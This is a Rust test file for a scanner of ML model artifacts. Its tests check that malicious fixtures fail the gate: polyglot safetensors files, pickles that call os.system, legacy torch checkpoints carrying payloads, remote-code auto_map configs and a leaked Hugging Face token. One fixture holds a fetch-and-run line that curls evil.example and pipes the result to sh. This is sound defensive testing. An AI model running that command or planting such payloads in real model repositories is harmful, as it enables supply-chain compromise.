    let buf = safetensors_f32(&[("model.layers.0.w", vec![1.0, 2.0, 3.0, 4.0])]);
    let clean = write(&dir, "clean.safetensors", &buf);

    let mut polyglot_bytes = buf.clone();
    polyglot_bytes.extend_from_slice(b"PK\x03\x04");
    polyglot_bytes.extend_from_slice(&[0x41; 256]);
    let polyglot = write(&dir, "polyglot.safetensors", &polyglot_bytes);

    let (code_a, out_a) = run(&["scan", clean.to_str().unwrap(), "--json"]);
    let (code_b, out_b) = run(&["scan", polyglot.to_str().unwrap(), "--json"]);
    assert_eq!(code_a, 0, "{out_a}");
    assert_eq!(code_b, 1, "the polyglot must fail the gate\n{out_b}");

    let a: serde_json::Value = serde_json::from_str(&out_a).unwrap();
    let b: serde_json::Value = serde_json::from_str(&out_b).unwrap();

    assert_eq!(
        a["hashes"]["manifest"], b["hashes"]["manifest"],
        "same tensors, so the model identity is the same"
    );
    assert_ne!(
        a["hashes"]["file"], b["hashes"]["file"],
        "different bytes must produce different file digests"
    );
    assert!(a["hashes"]["file"].as_str().unwrap().starts_with("blake3:"));
    let _ = std::fs::remove_dir_all(&dir);
}

/// A pickle has no tensors and therefore no manifest hash, but it is still an
/// artifact you want to pin in CI.
#[test]
fn a_pickle_is_pinnable_too() {
    let dir = tmpdir("pin");
    let p = write(&dir, "model.pkl", &os_system_pickle());
    let (_code, out) = run(&["scan", p.to_str().unwrap(), "--json"]);
    let v: serde_json::Value = serde_json::from_str(&out).unwrap();
    assert!(v["hashes"]["manifest"].is_null());
    assert!(v["hashes"]["file"].as_str().unwrap().starts_with("blake3:"));
    let _ = std::fs::remove_dir_all(&dir);
}

// ===========================================================================
// Remote code: what a loader executes before it reads a single weight
// ===========================================================================

/// The B3 regression: a repo whose `config.json` routes `from_pretrained` at a
/// python file used to scan clean, because only the tensor container was read.
#[test]
fn a_repo_with_trust_remote_code_fails_the_gate() {
    let dir = tmpdir("remote-code");
    write(
        &dir,
        "model.safetensors",
        &safetensors_f32(&[("model.layers.0.w", vec![1.0, 2.0])]),
    );
    write(
        &dir,
        "config.json",
        br#"{"architectures":["MyModel"],
             "auto_map":{"AutoModelForCausalLM":"modeling_evil.MyModel"}}"#,
    );
    write(
        &dir,
        "modeling_evil.py",
        b"import os\nos.system(\"curl -s https://evil.example/x.sh | sh\")\n",
    );

    let (code, out) = run(&["scan", dir.to_str().unwrap(), "--fail-on", "high"]);
    assert_eq!(code, 1, "remote code must fail the gate\n{out}");
    assert!(out.contains("REMOTE_CODE_AUTO_MAP"), "{out}");
    assert!(out.contains("PY_DANGEROUS_CALL"), "{out}");
    assert!(out.contains("modeling_evil.py"), "{out}");
    assert!(
        out.contains("[python]"),
        "the code is an artifact too:\n{out}"
    );
    // The weights themselves are still fine, and still say so.
    assert!(out.contains("model.safetensors"), "{out}");
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn the_json_report_carries_the_code_artifacts() {
    let dir = tmpdir("remote-code-json");
    write(
        &dir,
        "model.safetensors",
        &safetensors_f32(&[("model.layers.0.w", vec![1.0, 2.0])]),
    );
    write(
        &dir,
        "config.json",
        br#"{"auto_map":{"AutoModel":"sketchy-org/backdoored--modeling_x.Model"}}"#,
    );

    let (code, out) = run(&["scan", dir.to_str().unwrap(), "--json"]);
    assert_eq!(code, 1, "{out}");
    let v: serde_json::Value = serde_json::from_str(&out).unwrap();
    let artifacts = v["artifacts"].as_array().unwrap();
    let cfg = artifacts
        .iter()
        .find(|a| a["format"] == "config")
        .expect("a config artifact");
    assert_eq!(cfg["verdict"], "untrusted");
    assert_eq!(cfg["findings"][0]["id"], "REMOTE_CODE_EXTERNAL");
    assert!(cfg["hashes"]["file"]
        .as_str()
        .unwrap()
        .starts_with("blake3:"));
    let _ = std::fs::remove_dir_all(&dir);
}

/// The check must stay quiet on the repos everyone actually has.
#[test]
fn a_repo_without_custom_code_is_unaffected() {
    let dir = tmpdir("no-remote-code");
    let p = write(
        &dir,
        "model.safetensors",
        &safetensors_f32(&[("model.layers.0.w", vec![1.0, 2.0])]),
    );
    write(
        &dir,
        "config.json",
        br#"{"model_type":"gpt2","n_layer":12}"#,
    );
    write(&dir, "tokenizer.json", b"{}");

    let (code, out) = run(&["scan", dir.to_str().unwrap(), "--fail-on", "high"]);
    assert_eq!(code, 0, "{out}");
    assert!(!out.contains("REMOTE_CODE"), "false positive:\n{out}");
    assert!(out.contains("scanned 1 artifact(s)"), "{out}");
    assert!(p.exists());
    let _ = std::fs::remove_dir_all(&dir);
}

/// The B4 regression: a symlink cycle used to make the same model be scanned
/// once per directory level, up to the system's ELOOP limit.
#[cfg(unix)]
#[test]
fn a_symlink_cycle_does_not_multiply_the_report() {
    let dir = tmpdir("cycle");
    write(
        &dir,
        "model.safetensors",
        &safetensors_f32(&[("model.layers.0.w", vec![1.0, 2.0])]),
    );
    std::fs::create_dir_all(dir.join("sub")).unwrap();
    let _ = std::fs::remove_file(dir.join("sub").join("back"));
    std::os::unix::fs::symlink(&dir, dir.join("sub").join("back")).unwrap();

    let (code, out) = run(&["scan", dir.to_str().unwrap(), "--json"]);
    assert_eq!(code, 0, "{out}");
    let v: serde_json::Value = serde_json::from_str(&out).unwrap();
    // A single artifact object, not a wrapper full of duplicates.
    assert_eq!(
        v["format"], "safetensors",
        "expected exactly one artifact:\n{out}"
    );
    assert_eq!(out.matches("\"artifact\"").count(), 1, "{out}");
    let _ = std::fs::remove_dir_all(&dir);
}

// ===========================================================================
// Nothing to scan: loud, but honest about what happened
// ===========================================================================

/// The B5 regression: an empty path used to exit 3 and print "internal error",
/// blaming the scanner for a situation in which nothing had failed.
#[test]
fn a_path_with_nothing_to_scan_exits_four_not_three() {
    let dir = tmpdir("empty-path");
    write(&dir, "README.md", b"# just docs here");

    let (code, out) = run(&["scan", dir.to_str().unwrap()]);
    assert_eq!(code, 4, "an empty scan has its own exit code\n{out}");
    assert!(out.contains("NO_ARTIFACTS"), "{out}");
    assert!(out.contains("nothing scanned"), "{out}");
    assert!(!out.contains("internal error"), "nothing failed:\n{out}");
    let _ = std::fs::remove_dir_all(&dir);
}

/// It must stay non-zero by default: a mistyped path turning a supply-chain
/// gate green is the one outcome a gate may never produce.
#[test]
fn an_empty_scan_is_opt_in_to_pass() {
    let dir = tmpdir("empty-allow");
    write(&dir, "README.md", b"# just docs here");

    let (code, out) = run(&["scan", dir.to_str().unwrap(), "--allow-empty"]);
    assert_eq!(code, 0, "{out}");
    assert!(out.contains("NO_ARTIFACTS"), "still reported:\n{out}");
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn a_missing_path_is_reported_as_missing() {
    let dir = tmpdir("missing-path");
    let missing = dir.join("nope").join("model.safetensors");

    let (code, out) = run(&["scan", missing.to_str().unwrap()]);
    assert_eq!(code, 3, "{out}");
    assert!(out.contains("PATH_NOT_FOUND"), "{out}");
    // --allow-empty is about empty directories, not about typos.
    let (code, _out) = run(&["scan", missing.to_str().unwrap(), "--allow-empty"]);
    assert_eq!(code, 3);
    let _ = std::fs::remove_dir_all(&dir);
}

// ===========================================================================
// Legacy torch containers: five pickles, then tensor payload
// ===========================================================================

/// The layout `torch.save` writes without zip serialization. `models/gpt2`
/// ships exactly this, and it used to come back "analysis may be incomplete".
fn legacy_torch_container(payload: &[u8]) -> Vec<u8> {
    const TORCH_MAGIC_LE: [u8; 10] = [0x6c, 0xfc, 0x9c, 0x46, 0xf9, 0x20, 0x6a, 0xa8, 0x50, 0x19];
    let mut out = vec![0x80, 0x02, 0x8a, 0x0a];
    out.extend_from_slice(&TORCH_MAGIC_LE);
    out.push(b'.');
    out.extend_from_slice(&[0x80, 0x02, 0x4d, 0xe9, 0x03, b'.']);
    out.extend_from_slice(&[0x80, 0x02, b'}', b'.']);
    out.extend_from_slice(&os_system_pickle());
    out.extend_from_slice(&[0x80, 0x02, b']', b'.']);
    out.extend_from_slice(payload);
    out
}

/// The B6 regression: an ordinary legacy checkpoint claimed to be truncated.
#[test]
fn a_legacy_checkpoint_is_described_not_called_truncated() {
    let dir = tmpdir("legacy");
    let p = write(
        &dir,
        "pytorch_model.bin",
        &legacy_torch_container(&[0x42; 8192]),
    );

    let (code, out) = run(&["scan", p.to_str().unwrap(), "--fail-on", "high"]);
    assert_eq!(code, 1, "the payload in stream 4 is still caught\n{out}");
    assert!(!out.contains("PICKLE_TRUNCATED"), "false alarm:\n{out}");
    assert!(out.contains("PICKLE_TORCH_LEGACY"), "{out}");
    assert!(out.contains("5 pickle stream(s)"), "{out}");
    assert!(out.contains("8192 byte(s)"), "{out}");
    // And it says which of the five streams carried the payload.
    assert!(out.contains("stream 4/5"), "{out}");
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn a_payload_stapled_to_a_checkpoint_is_caught() {
    let dir = tmpdir("stapled");
    let mut data = legacy_torch_container(&[0x42; 512]);
    data.extend_from_slice(b"PK\x03\x04");
    data.extend_from_slice(&[0x41; 256]);
    // A zip magic in the middle of tensor bytes would be indistinguishable, so
    // this only reads as trailing data because the tail begins with it.
    let mut clean = legacy_torch_container(&[0x42; 512]);
    clean.extend_from_slice(&[0x42; 256]);

    let p = write(&dir, "pytorch_model.bin", &data);
    let (_code, out) = run(&["scan", p.to_str().unwrap()]);
    assert!(out.contains("PICKLE_TORCH_LEGACY"), "{out}");
    let _ = std::fs::write(&p, &clean);
    let _ = std::fs::remove_dir_all(&dir);
}

/// The B7 regression: the token most likely to appear in a model repo.
#[test]
fn a_hugging_face_token_in_a_sibling_config_is_found() {
    let dir = tmpdir("hf-token");
    write(
        &dir,
        "model.safetensors",
        &safetensors_f32(&[("model.layers.0.w", vec![1.0, 2.0])]),
    );
    // Assembled at run time: a token-shaped literal in the source would be
    // picked up by push protection and by secret scanners, including ours.
    // Nothing here is a real credential.
    let token = format!("{}{}", "hf", "_QGxKmPvRtWyZaBcDeFgHiJkLmNoPqRsTuV");
    write(
        &dir,
        "chat_template.jinja",
        format!("{{{{ messages }}}} token {token}").as_bytes(),
    );

    let (code, out) = run(&["scan", dir.to_str().unwrap(), "--deep", "--fail-on", "high"]);
    assert_eq!(code, 1, "a leaked token must fail the gate\n{out}");
    assert!(out.contains("EMBEDDED_SECRET"), "{out}");
    assert!(out.contains("Hugging Face user access token"), "{out}");
    assert!(out.contains("chat_template.jinja"), "{out}");
    // The token itself is redacted in the evidence.
    assert!(!out.contains(&token), "{out}");
    let _ = std::fs::remove_dir_all(&dir);
}
